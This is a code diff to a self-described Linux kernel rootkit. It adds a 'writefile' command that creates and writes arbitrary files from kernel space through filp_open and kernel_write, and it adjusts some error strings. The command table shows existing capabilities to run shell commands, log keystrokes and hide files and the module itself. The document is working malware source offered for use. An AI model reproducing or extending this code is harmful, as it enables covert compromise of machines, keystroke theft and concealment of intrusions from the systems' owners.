@@ -15,13 +15,15 @@ command_t parse_command(char* data)
         "shell \0", "mycat \0",
         "keylog\0", "hide \0",
         "unhide \0", "hidemod\0",
-        "unhidemod\0", "randswitch\0"
+        "unhidemod\0", "randswitch\0",
+        "writefile \0"
       };
     command_t commands[COMMAND_NUM] = {
         RUN, CAT,
         KEYLOG, HIDE,
         UNHIDE, HIDEMOD,
-        UNHIDEMOD, SWITCH_RANDOM
+        UNHIDEMOD, SWITCH_RANDOM,
+        WRITE_FILE
         };
     u32 i, shift, j;
 
@@ -75,7 +77,7 @@ void run_command(args_t* args) {
 
     if (!envp) {
         mutex_unlock(&driver_data.mutex);
-        send_response("rootkit: error while allocating envp", args);
+        send_response("rootkit: error while allocating envp\0", args);
         kfree(buffer);
         return;
 
@@ -86,7 +88,7 @@ void run_command(args_t* args) {
         envp[i] = kmalloc(strlen(driver_data.env[i]) + 1, GFP_KERNEL);
         if (!envp[i]) {
             mutex_unlock(&driver_data.mutex);
-            send_response("rootkit: error while allocating env variable", args);
+            send_response("rootkit: error while allocating env variable\0", args);
             goto finish;
         }
         strcpy(envp[i], driver_data.env[i]);
@@ -185,6 +187,31 @@ int read_file(char* filename, char* buffer, int to_read, loff_t start) {
 
 }
 
+// creates file with content from the given buffer
+int write_file(char* filename, char* buffer) {
+    struct file *f;
+    u32 size = strlen(buffer);
+    loff_t offset = 0;
+        
+    f = filp_open(filename, O_CREAT | O_WRONLY, 0);
+
+
+    if (IS_ERR(f)) {
+        DEBUG_PUTS("rootkit: file was not open\n")
+        return -1;
+    }
+
+    kernel_write(f, (void*) buffer, size, &offset);
+
+
+    DEBUG_PUTS("rootkit: file was written\n")
+
+    filp_close(f, NULL);
+    
+    return 0;
+
+}
+
 
 void cat_command(args_t* args) {
     char* string = args->string;
@@ -196,34 +223,34 @@ void cat_command(args_t* args) {
 
     first_arg_len = get_arg_len(string);
     if (string[first_arg_len] == '\0') {
-        send_response("rootkit: cat got only one argument\0", args);
+        send_response("rootkit: cat got only one argument\n", args);
         return;
     }
     string[first_arg_len] = '\0';
 
     second_arg_len = get_arg_len(string + first_arg_len + 1);
     if (string[second_arg_len + first_arg_len + 1] == '\0') {
-        send_response("rootkit: cat got only two arguments\0", args);
+        send_response("rootkit: cat got only two arguments\n", args);
         return;
     }
     string[first_arg_len + second_arg_len + 1] = '\0';
 
     if (kstrtou32(string, 10, &start_index) != 0) {
-        send_response("rootkit: cat got invalid start index\0", args);
+        send_response("rootkit: cat got invalid start index\n", args);
         return;
     }
 
     DEBUG_PRINTF("rootkit: first_arg=%s", string)
 
     if (kstrtou32(string + first_arg_len + 1, 10, &count) != 0) {
-        send_response("rootkit: cat got invalid count\0", args);
+        send_response("rootkit: cat got invalid count\n", args);
         return;
     }
 
     DEBUG_PRINTF("rootkit: second_arg=%s", string + first_arg_len + 1)
 
     if (count >= REQUEST_SIZE_LIMIT) {
-        send_response("rootkit: too many bytes to read\0", args);
+        send_response("rootkit: too many bytes to read\n", args);
         return;
     }
 
@@ -236,9 +263,40 @@ void cat_command(args_t* args) {
     if (read_file(string + first_arg_len + second_arg_len + 2, buffer, count, start_index) == 0) {   
         send_response(buffer, args);
     } else {
-        send_response("rootkit: error while reading\0", args);
+        send_response("rootkit: error while reading\n", args);
     }
     kfree(buffer);
+
+}
+
+
+void write_file_command(args_t* args) {
+    char* string = args->string;
+    u32 first_arg_len;
+    u32 second_arg_len;
+
+
+    first_arg_len = get_arg_len(string);
+    if (string[first_arg_len] == '\0') {
+        send_response("rootkit: write command got only one argument\n", args);
+        return;
+    }
+    string[first_arg_len] = '\0';
+
+    second_arg_len = strlen(string + first_arg_len + 1);
+
+
+    DEBUG_PRINTF("rootkit: first_arg=%s", string)
+
+    DEBUG_PRINTF("rootkit: second_arg=%s", string + first_arg_len + 1)
+
+
+    // checking errors
+    if (write_file(string, string + first_arg_len + 1) == 0) {   
+        send_response("rootkit: successfully wrote to file\n", args);
+    } else {
+        send_response("rootkit: error while writing\n", args);
+    }
 
 }
 
